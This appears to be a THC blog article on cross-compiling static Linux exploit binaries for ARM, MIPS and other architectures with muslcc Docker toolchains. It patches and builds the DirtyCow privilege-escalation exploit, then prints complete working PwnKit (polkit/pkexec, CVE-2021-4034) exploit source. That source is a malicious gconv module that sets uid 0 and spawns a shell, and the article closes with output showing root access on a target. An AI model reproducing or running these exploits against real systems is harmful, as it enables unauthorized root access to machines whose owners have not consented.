
**TL;DR**: Use docker with the [muslcc toolchain](https://hub.docker.com/r/muslcc/x86_64/tags) and _gcc -static_.

It is not always possible to compile an exploit on the target system. Here at THC we use various methods to cross-compile static Linux binaries. I'll explain some of our methods in this article.

Let's compile the exploit for [CVE-2016-5195](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5195) to run on Raspberry PI Linux (armv6l) while our workstation is MacOS (x86_64).

The vulnerability is a local privilege escalation in Linux Kernel <4.8.3.

## Using muslcc toolchain

The fine folks at https://musl.cc/ maintain cross-compiler toolchains for many different architectures.

These toolchains can be used to generate a (static) Linux binary for a different architecture than the architecture used for compiling the exploit (x86_64):

Firstly, there is a bug in the reference exploit. Let's fix this first:
```shell
mkdir thc; cd thc
wget https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c
sed  -i 'sX.*= copy_file.*Xint ret = system("cp /etc/passwd /tmp/passwd.bak");X' dirty.c
```

Next: Compile dirt.c for Linux for armv6 architecture on our MacOS (x84_64):
```shell
docker run --rm -v $(pwd):/src -w /src muslcc/x86_64:armv6-linux-musleabi sh -c "gcc -pthread dirty.c -o dirty-exp -lcrypt -static"
```

The newly created `./dirty-exp` binary will execute on a Raspberry Pi Linux (armv6l).

## Cross Compiling for 5 architectures

Let's script this and compile for 5 different architectures:
```shell
for arch in aarch64-linux-musl armv6-linux-musleabi mips-linux-muslsf mips64-linux-musl x86_64-linux-musl; do
   docker run --rm -v $(pwd):/src -w /src muslcc/x86_64:${arch} sh -c "gcc -pthread dirty.c -o dirty-exp.${arch} -lcrypt -static"
done
```

Most architectures are _downward compatible_. This means an exploit compiled for arm6 will run fine on arm7 metal. Equally an exploit compiled for i386 (from the 90s) will run fine on x86_64 metal, albeit slow.

```console
$ ls -al dirty-exp.*
-rwxr-xr-x 1 0 0 170664 Aug 30 14:06 dirty-exp.aarch64-linux-musl
-rwxr-xr-x 1 0 0 119280 Aug 30 14:06 dirty-exp.armv6-linux-musleabi
-rwxr-xr-x 1 0 0 210384 Aug 30 14:06 dirty-exp.mips64-linux-musl
-rwxr-xr-x 1 0 0 210692 Aug 30 14:06 dirty-exp.mips-linux-muslsf
-rwxr-xr-x 1 0 0  88312 Aug 30 14:06 dirty-exp.x86_64-linux-musl
```

All binaries are static binaries. They run on any Linux system regardless of the distribution or Linux flavour (as long as the architecture matches).

## Statically compiling with other libraries

Some exploits need additional libraries to compile or have more complex compilation instructions. Let's pick the OpenSSL library as a worst case scenario: A huge and complex library. We use the dirt.c source again even that it does not depend on or need OpenSSL.

Let's start an interactive (_-it_) muslcc docker shell, download and compile OpenSSL and then compile the exploit for ARM6:

```shell
docker run --rm -v $(pwd):/src -w /src -it muslcc/x86_64:armv6-linux-musleabi
apk update \
&& apk add --no-cache bash perl make curl \
&& rm -rf /var/cache/apk/* \
&& curl https://www.openssl.org/source/openssl-1.1.1k.tar.gz | tar -xz \
&& mkdir usr \
&& cd openssl-1.1.1k \
&& ./Configure --prefix=/src/usr no-tests no-dso no-threads no-shared linux-generic64 \
&& make install_sw \
&& cd .. \
&& gcc -I/src/usr/include -L/src/usr/lib -pthread dirty.c -o dirty-exp -lcrypt -lcrypto -lssl -static
```

## Exploits that need .so files

Some exploits can not be compiled statically.

For example: Exploits that are shared object .so files and which the vulnerable program needs to load during runtime. It is not possible to cross-compile them: The .so files heavily depend on the ABI of the target system.

It's easier to find a system that is similar to the target system and compile there.

### Targeting aarch64

The assumption is that it is not possible to compile the exploit on the target system. Instead we use a system with the same architecture and where the Linux flavour is a close match to the target system (a matching libc version often is what matters most).

AWS has a good selection Linux flavours (Ubuntu, Red Hat, SuSE and Debian) and supports x86_64, aarch64/ARM64 and some wilder architectures. It is free to spin up a t2.nano instance on (for example) aarch64 architecture use that system to compile the exploit. THC also runs a private lab with various other architectures and Unix flavours.

### Compiling [CVE-2021-4034] for aarch64

A good example is [CVE-2021-4034](https://github.com/arthepsy/CVE-2021-4034/) also known as polkit/pkexec exploit. The exploit compiles additional .c files during runtime _and_ the vulnerable program needs to load the newly compiled .so file.

There are better exploits but the reference exploit [cve-2021-4043-poc.c](https://github.com/arthepsy/CVE-2021-4034/blob/main/cve-2021-4034-poc.c) is just perfect for what we like to showcase.

We need to modify the original exploit in two ways:
1. Split it into two separate .c files.
1. Modify the source to copy the pre-compiled .so file instead of compiling it at runtime.

thc-polkit.c
```C
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int main(int argc, char *argv[]) {
	system("mkdir -p 'GCONV_PATH=.'; touch 'GCONV_PATH=./pwnkit'; chmod a+x 'GCONV_PATH=./pwnkit'");
	system("mkdir -p pwnkit; echo 'module UTF-8// PWNKIT// pwnkit 2' > pwnkit/gconv-modules");
	system("cp pwnkit.so pwnkit/pwnkit.so");
	char *env[] = { "pwnkit", "PATH=GCONV_PATH=.", "CHARSET=PWNKIT", "SHELL=pwnkit", NULL };
	execve("/usr/bin/pkexec", (char*[]){NULL}, env);
}
```

pwnkit.c
```C
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void gconv() {}
void gconv_init() {
	setuid(0); setgid(0);
	seteuid(0); setegid(0);
	system("export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf 'GCONV_PATH=.' 'pwnkit'; /bin/sh");
}
```

Compile both source files:
```shell
gcc pwnkit.c -o pwnkit.so -shared -fPIC
gcc thc-polkit.c -o thc-polkit -static
```

Transfer `thc-polkit` and `pwnkit.so` to the target system and execute:
```console
$ ./thc-polkit
# id
uid=0(root) gid=0(root) groups=0(root)
#
```

